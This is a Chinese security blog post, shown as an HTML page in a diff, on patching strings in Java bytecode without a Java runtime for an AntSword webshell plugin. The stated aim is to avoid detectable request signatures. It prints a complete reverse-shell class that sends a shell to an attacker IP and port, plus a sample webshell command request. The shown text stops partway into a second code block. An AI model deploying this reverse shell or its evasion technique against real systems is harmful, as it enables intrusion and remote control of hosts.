@@ -1,0 +1,702 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>无java环境修改字节码 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="无java环境修改字节码" />
+<meta property="og:description" content="1 前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/node-edit-java-class/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-11-09T10:00:00+00:00" />
+<meta property="article:modified_time" content="2020-11-09T10:00:00+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="无java环境修改字节码"/>
+<meta name="twitter:description" content="1 前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/node-edit-java-class/" /><link rel="prev" href="https://yzddmr6.com/posts/antsword-diy-5/" /><link rel="next" href="https://yzddmr6.com/posts/as-exploits/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "无java环境修改字节码",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/node-edit-java-class\/"
+        },"genre": "posts","wordcount":  2065 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/node-edit-java-class\/","datePublished": "2020-11-09T10:00:00+00:00","dateModified": "2020-11-09T10:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#需求">需求</a></li>
+        <li><a href="#java字节码结构">Java字节码结构</a></li>
+        <li><a href="#如何修改">如何修改</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">无java环境修改字节码</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-11-09">2020-11-09</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-11-09">2020-11-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2065 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#需求">需求</a></li>
+        <li><a href="#java字节码结构">Java字节码结构</a></li>
+        <li><a href="#如何修改">如何修改</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。</p>
+<h2 id="正文" class="headerLink">
+    <a href="#%e6%ad%a3%e6%96%87" class="header-mark"></a>2 正文</h2><h3 id="需求" class="headerLink">
+    <a href="#%e9%9c%80%e6%b1%82" class="header-mark"></a>2.1 需求</h3><p>在<a href="https://yzddmr6.tk/posts/antsword-diy-3/" target="_blank" rel="noopener noreferrer">蚁剑改造计划之实现JSP一句话</a>中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。</p>
+<p>例如</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST:   ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。</p>
+<h3 id="java字节码结构" class="headerLink">
+    <a href="#java%e5%ad%97%e8%8a%82%e7%a0%81%e7%bb%93%e6%9e%84" class="header-mark"></a>2.2 Java字节码结构</h3><p>这里以As_Exploits中的jsp反弹shell的payload为例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.*;
+</span></span><span class="line"><span class="cl">import java.net.Socket;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class ShellReverseTCP extends Thread {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    InputStream zj;
+</span></span><span class="line"><span class="cl">    OutputStream sd;
+</span></span><span class="line"><span class="cl">    public static String ip;
+</span></span><span class="line"><span class="cl">    public static String port;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    ShellReverseTCP(InputStream zj, OutputStream sd) {
+</span></span><span class="line"><span class="cl">        this.zj = zj;
+</span></span><span class="line"><span class="cl">        this.sd = sd;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public ShellReverseTCP() {
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public boolean equals(Object obj){
+</span></span><span class="line"><span class="cl">        ip=&#34;targetIP&#34;;
+</span></span><span class="line"><span class="cl">        port=&#34;targetPORT&#34;;
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            RunShellReverseTCP();
+</span></span><span class="line"><span class="cl">            return true;
+</span></span><span class="line"><span class="cl">        }catch (Exception e){
+</span></span><span class="line"><span class="cl">            return false;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public static void main(String[] args) {
+</span></span><span class="line"><span class="cl">        ip=&#34;192.168.88.129&#34;;
+</span></span><span class="line"><span class="cl">        port=&#34;9999&#34;;
+</span></span><span class="line"><span class="cl">        ShellReverseTCP shellReverseTCP = new ShellReverseTCP();
+</span></span><span class="line"><span class="cl">        shellReverseTCP.RunShellReverseTCP();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void RunShellReverseTCP() {
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            String ShellPath;
+</span></span><span class="line"><span class="cl">            if (System.getProperty(&#34;os.name&#34;).toLowerCase().indexOf(&#34;windows&#34;) == -1) {
+</span></span><span class="line"><span class="cl">                ShellPath = new String(&#34;/bin/sh&#34;);
+</span></span><span class="line"><span class="cl">            } else {
+</span></span><span class="line"><span class="cl">                ShellPath = new String(&#34;cmd.exe&#34;);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            Socket socket = new Socket(ip, Integer.parseInt(port));
+</span></span><span class="line"><span class="cl">            Process process = Runtime.getRuntime().exec(ShellPath);
+</span></span><span class="line"><span class="cl">            (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start();
+</span></span><span class="line"><span class="cl">            (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start();
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void run() {
+</span></span><span class="line"><span class="cl">        BufferedReader yx = null;
+</span></span><span class="line"><span class="cl">        BufferedWriter jah = null;
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            yx = new BufferedReader(new InputStreamReader(this.zj));
+</span></span><span class="line"><span class="cl">            jah = new BufferedWriter(new OutputStreamWriter(this.sd));
+</span></span><span class="line"><span class="cl">            char buffer[] = new char[8192];
+</span></span><span class="line"><span class="cl">            int length;
+</span></span><span class="line"><span class="cl">            while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) {
+</span></span><span class="line"><span class="cl">                jah.write(buffer, 0, length);
+</span></span><span class="line"><span class="cl">                jah.flush();
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            if (yx != null)
+</span></span><span class="line"><span class="cl">                yx.close();
+</span></span><span class="line"><span class="cl">            if (jah != null)
+</span></span><span class="line"><span class="cl">                jah.close();
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。</p>
+<p>用010editor打开编译后的字节码文件查看。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp" title="image" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp"
+            srcset="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp, https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp 1.5x, https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。</p>
+<p>常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>标志</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CONSTANT_utf8_info</td>
+<td>1</td>
+<td>UTF-8编码的字符串</td>
+</tr>
+<tr>
+<td>CONSTANT_Integer_info</td>
+<td>3</td>
+<td>整形字面量</td>
+</tr>
+<tr>
+<td>CONSTANT_Float_info</td>
+<td>4</td>
+<td>浮点型字面量</td>
+</tr>
+<tr>
+<td>CONSTANT_Long_info</td>
+<td>5</td>
+<td>长整型字面量</td>
+</tr>
+<tr>
+<td>CONSTANT_Double_info</td>
+<td>6</td>
+<td>双精度浮点型字面量</td>
+</tr>
+<tr>
+<td>CONSTANT_Class_info</td>
+<td>7</td>
+<td>类或接口的符号引用</td>
+</tr>
+<tr>
+<td>CONSTANT_String_info</td>
+<td>8</td>
+<td>字符串类型字面量</td>
+</tr>
+<tr>
+<td>CONSTANT_Fieldref_info</td>
+<td>9</td>
+<td>字段的符号引用</td>
+</tr>
+<tr>
+<td>CONSTANT_Methodref_info</td>
+<td>10</td>
+<td>类中方法的符号引用</td>
+</tr>
+<tr>
+<td>CONSTANT_InterfaceMethodref_info</td>
+<td>11</td>
+<td>接口中方法的符号引用</td>
+</tr>
+<tr>
+<td>CONSTANT_NameAndType_info</td>
+<td>12</td>
+<td>字段或方法的符号引用</td>
+</tr>
+<tr>
+<td>CONSTANT_MethodHandle_info</td>
+<td>15</td>
+<td>表示方法句柄</td>
+</tr>
+<tr>
+<td>CONSTANT_MothodType_info</td>
+<td>16</td>
+<td>标志方法类型</td>
+</tr>
+<tr>
+<td>CONSTANT_InvokeDynamic_info</td>
+<td>18</td>
+<td>表示一个动态方法调用点</td>
+</tr>
+</tbody>
+</table>
+<p>这14种类型的结构各不相同，如下表格所示：</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png" title="image" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png 2x"
+            sizes="auto"
+            alt="image">
+    </a></figure>``</p>
+<blockquote>
+<p>注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。</p>
+</blockquote>
+<p>从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。</p>
+<p>我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。</p>
+<p>也就是说关键的结构就是这个</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。</p>
+<p>结合文件来看</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png 1.5x, https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。</p>
+<h3 id="如何修改" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e4%bf%ae%e6%94%b9" class="header-mark"></a>2.3 如何修改</h3><p>既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。</p>
+<p>把yan表哥的代码抽出来修改一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
